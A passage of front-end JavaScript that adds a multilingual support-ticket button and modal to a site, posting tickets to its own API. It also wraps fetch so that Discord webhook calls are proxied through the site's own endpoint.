    en: { btn: '💬 Support', title: 'Open Support Ticket', user: 'Your username', msg: 'Describe your issue...', send: 'Send Ticket', sending: 'Sending...', ok: '✅ Ticket sent! We\'ll help you soon.', err: '❌ Error sending. Try again.' },
    pt: { btn: '💬 Suporte', title: 'Abrir Ticket de Suporte', user: 'Seu usuário', msg: 'Descreva o problema...', send: 'Enviar Ticket', sending: 'Enviando...', ok: '✅ Ticket enviado! Em breve te ajudamos.', err: '❌ Erro ao enviar. Tente novamente.' },
    es: { btn: '💬 Soporte', title: 'Abrir Ticket de Soporte', user: 'Tu usuario', msg: 'Describe el problema...', send: 'Enviar Ticket', sending: 'Enviando...', ok: '✅ ¡Ticket enviado! Te ayudaremos pronto.', err: '❌ Error al enviar. Inténtalo de nuevo.' },
    ru: { btn: '💬 \u041f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0430', title: '\u041e\u0442\u043a\u0440\u044b\u0442\u044c \u0442\u0438\u043a\u0435\u0442', user: '\u0412\u0430\u0448 \u043d\u0438\u043a', msg: '\u041e\u043f\u0438\u0448\u0438\u0442\u0435 \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u0443...', send: '\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c \u0442\u0438\u043a\u0435\u0442', sending: '\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430...', ok: '\u2705 \u0422\u0438\u043a\u0435\u0442 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d!', err: '\u274c \u041e\u0448\u0438\u0431\u043a\u0430. \u041f\u043e\u0432\u0442\u043e\u0440\u0438\u0442\u0435 \u043f\u043e\u043f\u044b\u0442\u043a\u0443.' },
    fr: { btn: '💬 Support', title: 'Ouvrir un ticket', user: 'Votre pseudo', msg: 'D\u00e9crivez votre probl\u00e8me...', send: 'Envoyer', sending: 'Envoi...', ok: '\u2705 Ticket envoy\u00e9 !', err: '\u274c Erreur. R\u00e9essayez.' },
    de: { btn: '💬 Support', title: 'Support-Ticket \u00f6ffnen', user: 'Ihr Nutzername', msg: 'Beschreiben Sie das Problem...', send: 'Ticket senden', sending: 'Senden...', ok: '\u2705 Ticket gesendet!', err: '\u274c Fehler. Nochmal versuchen.' },
    it: { btn: '💬 Supporto', title: 'Apri ticket di supporto', user: 'Il tuo username', msg: 'Descrivi il problema...', send: 'Invia ticket', sending: 'Invio...', ok: '\u2705 Ticket inviato!', err: '\u274c Errore. Riprova.' },
    tr: { btn: '💬 Destek', title: 'Destek Bileti A\u00e7', user: 'Kullan\u0131c\u0131 ad\u0131n\u0131z', msg: 'Sorunu a\u00e7\u0131klay\u0131n...', send: 'Ticket G\u00f6nder', sending: 'G\u00f6nderiliyor...', ok: '\u2705 Ticket g\u00f6nderildi!', err: '\u274c Hata. Tekrar deneyin.' },
  };

  function injectSupportSystem() {
    var lang = localStorage.getItem(LANG_KEY) || 'en';
    var i18n = SUPPORT_I18N[lang] || SUPPORT_I18N.en;

    /* CSS */
    var style = document.createElement('style');
    style.textContent = [
      '#rc-support-btn{position:fixed;bottom:24px;left:24px;z-index:999990;',
        'background:linear-gradient(135deg,rgba(4,20,8,0.98),rgba(2,12,5,0.98));',
        'border:1px solid rgba(34,197,94,0.35);border-radius:14px;',
        'color:rgba(255,255,255,0.9);font-family:Outfit,Inter,sans-serif;',
        'font-size:13px;font-weight:700;padding:10px 16px;cursor:pointer;',
        'box-shadow:0 4px 24px rgba(22,163,74,0.2);transition:all 0.2s ease;}',
      '#rc-support-btn:hover{background:rgba(22,163,74,0.15);border-color:rgba(34,197,94,0.6);',
        'transform:translateY(-2px);box-shadow:0 8px 32px rgba(22,163,74,0.3);}',
      '#rc-support-overlay{position:fixed;inset:0;z-index:999991;display:none;',
        'align-items:center;justify-content:center;',
        'background:rgba(2,13,4,0.85);backdrop-filter:blur(16px);}',
      '#rc-support-overlay.open{display:flex;}',
      '#rc-support-modal{background:linear-gradient(180deg,rgba(4,20,8,0.99),rgba(2,12,5,0.99));',
        'border:1px solid rgba(34,197,94,0.25);border-radius:20px;',
        'box-shadow:0 40px 80px rgba(0,0,0,0.8);padding:32px;',
        'width:calc(100vw - 40px);max-width:420px;font-family:Outfit,Inter,sans-serif;',
        'position:relative;animation:rc-fadein 0.3s ease;}',
      '#rc-support-close{position:absolute;top:14px;right:14px;background:none;border:none;',
        'color:rgba(255,255,255,0.4);font-size:18px;cursor:pointer;padding:4px 8px;',
        'border-radius:8px;line-height:1;}',
      '#rc-support-close:hover{color:#fff;background:rgba(255,255,255,0.08);}',
      '#rc-support-title{font-size:17px;font-weight:800;color:#fff;margin:0 0 20px;',
        'letter-spacing:-0.02em;}',
      '.rc-support-label{display:block;font-size:11px;font-weight:600;',
        'color:rgba(134,239,172,0.6);letter-spacing:0.08em;text-transform:uppercase;margin-bottom:6px;}',
      '.rc-support-input{width:100%;box-sizing:border-box;background:rgba(22,163,74,0.06);',
        'border:1px solid rgba(34,197,94,0.2);border-radius:10px;',
        'color:#fff;font-family:Outfit,Inter,sans-serif;font-size:13px;',
        'padding:10px 14px;margin-bottom:14px;outline:none;resize:none;',
        'transition:border-color 0.2s;}',
      '.rc-support-input:focus{border-color:rgba(34,197,94,0.5);}',
      '#rc-support-submit{width:100%;padding:12px;border:none;border-radius:12px;',
        'background:linear-gradient(135deg,#16a34a,#15803d);color:#fff;',
        'font-family:Outfit,Inter,sans-serif;font-size:14px;font-weight:700;',
        'cursor:pointer;transition:all 0.2s;margin-top:4px;}',
      '#rc-support-submit:hover{background:linear-gradient(135deg,#22c55e,#16a34a);}',
      '#rc-support-submit:disabled{opacity:0.5;cursor:not-allowed;}',
      '#rc-support-feedback{font-size:13px;font-weight:600;text-align:center;',
        'margin-top:12px;min-height:18px;}',
    ].join('');
    document.head.appendChild(style);

    /* Floating button */
    var btn = document.createElement('button');
    btn.id = 'rc-support-btn';
    btn.textContent = i18n.btn;
    document.body.appendChild(btn);

    /* Modal overlay */
    var modalOverlay = document.createElement('div');
    modalOverlay.id = 'rc-support-overlay';
    modalOverlay.innerHTML = [
      '<div id="rc-support-modal">',
        '<button id="rc-support-close">✕</button>',
        '<p id="rc-support-title">🎫 ' + i18n.title + '</p>',
        '<label class="rc-support-label" for="rc-support-user">' + i18n.user + '</label>',
        '<input id="rc-support-user" class="rc-support-input" type="text" autocomplete="off" maxlength="60">',
        '<label class="rc-support-label" for="rc-support-msg">' + i18n.msg.replace('...','') + '</label>',
        '<textarea id="rc-support-msg" class="rc-support-input" rows="4" placeholder="' + i18n.msg + '" maxlength="500"></textarea>',
        '<button id="rc-support-submit">' + i18n.send + '</button>',
        '<div id="rc-support-feedback"></div>',
      '</div>',
    ].join('');
    document.body.appendChild(modalOverlay);

    /* Open / close */
    btn.addEventListener('click', function () {
      modalOverlay.classList.add('open');
      document.getElementById('rc-support-user').focus();
    });
    document.getElementById('rc-support-close').addEventListener('click', function () {
      modalOverlay.classList.remove('open');
    });
    modalOverlay.addEventListener('click', function (e) {
      if (e.target === modalOverlay) modalOverlay.classList.remove('open');
    });

    /* Submit */
    document.getElementById('rc-support-submit').addEventListener('click', function () {
      var submitBtn = document.getElementById('rc-support-submit');
      var feedback = document.getElementById('rc-support-feedback');
      var username = document.getElementById('rc-support-user').value.trim();
      var message = document.getElementById('rc-support-msg').value.trim();

      if (!username || !message) {
        feedback.style.color = '#fca5a5';
        feedback.textContent = '⚠️ Preencha todos os campos.';
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = i18n.sending;
      feedback.textContent = '';

      fetch('/api/support/ticket', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username, message: message, lang: lang }),
      })
        .then(function (r) { return r.json(); })
        .then(function (data) {
          if (data.ok) {
            feedback.style.color = '#86efac';
            feedback.textContent = i18n.ok;
            document.getElementById('rc-support-user').value = '';
            document.getElementById('rc-support-msg').value = '';
            setTimeout(function () { modalOverlay.classList.remove('open'); feedback.textContent = ''; }, 2500);
          } else {
            throw new Error('not ok');
          }
        })
        .catch(function () {
          feedback.style.color = '#fca5a5';
          feedback.textContent = i18n.err;
        })
        .finally(function () {
          submitBtn.disabled = false;
          submitBtn.textContent = i18n.send;
        });
    });
  }

  /* Inject support UI after page loads */
  if (document.body) {
    injectSupportSystem();
  } else {
    document.addEventListener('DOMContentLoaded', injectSupportSystem);
  }

  /* ── Webhook proxy: redirect Discord calls to our API ───── */
  var _origFetch = window.fetch.bind(window);
  window.fetch = function (input, init) {
    var url = typeof input === 'string' ? input : (input instanceof Request ? input.url : String(input));
    if (url && url.includes('discord.com/api/webhooks')) {
      return _origFetch('/api/webhook/discord', Object.assign({}, init, { method: 'POST' }));
    }
    return _origFetch(input, init);
  };

})();
